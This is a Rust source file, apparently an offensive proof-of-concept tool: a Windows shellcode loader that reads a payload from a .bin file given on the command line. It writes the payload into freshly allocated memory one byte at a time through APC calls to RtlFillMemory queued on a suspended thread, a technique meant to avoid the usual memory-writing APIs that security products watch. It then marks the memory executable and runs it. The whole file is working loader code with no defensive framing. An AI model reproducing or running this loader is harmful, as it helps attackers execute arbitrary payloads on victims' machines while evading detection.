use std::fs::File;
use std::io::{Read, Error};
use std::{ptr, env};
use std::process::exit;
use std::mem::transmute;
use colored::Colorize;
use phnt::ffi::{NtQueueApcThread, NtCreateThreadEx, HANDLE, ACCESS_MASK, PUSER_THREAD_START_ROUTINE, NTSTATUS, PPS_APC_ROUTINE};
use windows::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE as WIN32_HANDLE},
    System::{
        Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS},
        Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS, ResumeThread, TerminateThread, GetCurrentProcess},
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
    },
};
use windows::core::PCSTR;

const NT_CREATE_THREAD_EX_SUSPENDED: u32 = 1;
const NT_CREATE_THREAD_EX_ALL_ACCESS: u32 = 0x1F0FFF;

type RtlFillMemoryFn = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u8);

fn get_rtl_fill_memory() -> Option<RtlFillMemoryFn> {
    unsafe {
        let kernel32 = GetModuleHandleA(PCSTR("kernel32.dll\0".as_ptr()));
        if kernel32.is_err() {
            return None;
        }
        let proc_addr = GetProcAddress(kernel32.unwrap(), PCSTR("RtlFillMemory\0".as_ptr()));
        proc_addr.map(|addr| transmute(addr))
    }
}

unsafe extern "system" fn thread_start(_parameter: *mut core::ffi::c_void) -> u32 {
    0
}

fn writeprocessmemoryapc(h_process: HANDLE, p_address: *mut u8, p_data: *const u8, dw_length: usize) -> NTSTATUS {
    let rtl_fill_memory = match get_rtl_fill_memory() {
        Some(func) => func,
        None => {
            println!("failed to get RtlFillMemory function address");
            exit(1);
        }
    };

    let mut h_thread: HANDLE = 0 as HANDLE;

    unsafe {
        let start_routine: PUSER_THREAD_START_ROUTINE = transmute(thread_start as unsafe extern "system" fn(*mut core::ffi::c_void) -> u32);
        NtCreateThreadEx(
            &mut h_thread,
            NT_CREATE_THREAD_EX_ALL_ACCESS as ACCESS_MASK,
            ptr::null_mut(),
            h_process,
            start_routine,
            p_data as *mut _,
            NT_CREATE_THREAD_EX_SUSPENDED,
            0, 0, 0,
            ptr::null_mut()
        );

        for i in 0..dw_length {
            let apc_routine: PPS_APC_ROUTINE = transmute(rtl_fill_memory as usize);
            let result = NtQueueApcThread(
                h_thread,
                apc_routine,
                p_address.add(i) as *mut _,
                1 as *mut _,
                *p_data.add(i) as *mut _
            );

            if result != 0 {
                TerminateThread(WIN32_HANDLE(h_thread), 0).expect("Failed to terminate thread");
                CloseHandle(WIN32_HANDLE(h_thread)).expect("Failed to close thread handle");
                return result;
            }
        }

        ResumeThread(WIN32_HANDLE(h_thread));
        WaitForSingleObject(WIN32_HANDLE(h_thread), INFINITE);
        CloseHandle(WIN32_HANDLE(h_thread)).expect("Failed to close thread handle");
        0
    }
}

fn read_shellcode(path: &str) -> Result<Vec<u8>, Error> {
    let mut shellcode_bytes = File::open(path)?;
    let mut buffer = Vec::new();
    shellcode_bytes.read_to_end(&mut buffer)?;
    Ok(buffer)
}

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        println!("{}: Invalid amount of arguments", "Error".red());
        println!("{}: cargo run <path-to-shellcode/*.bin>", "Example".blue());
        exit(1);
    }

    let shellcode = read_shellcode(&args[1]).expect("Failed to read shellcode.");

    unsafe {
        let mem_addr = VirtualAlloc(Some(ptr::null_mut()), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if mem_addr.is_null() {
            println!("[-] VirtualAlloc failed with error {}", GetLastError().0);
            exit(1);
        }

        println!("[+] Memory Allocated at {:p}", mem_addr);

        let status = writeprocessmemoryapc(
            transmute(GetCurrentProcess()),
            mem_addr as *mut u8,
            shellcode.as_ptr(),
            shellcode.len()
        );

        if status != 0 {
            println!("[-] writeprocessmemoryapc failed with NTSTATUS: {:#x}", status);
            exit(1);
        }

        VirtualProtect(mem_addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut PAGE_PROTECTION_FLAGS(0)).expect("Failed to set memory protection");

        let h_thread = CreateThread(
            Some(ptr::null()),
            0,
            Some(transmute(mem_addr)),
            Some(ptr::null()),
            THREAD_CREATION_FLAGS(0),
            Some(ptr::null_mut())
        ).expect("Failed to create thread");

        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread).expect("Failed to close thread handle");
    }

    println!("[!] Success! Executed shellcode.");
}
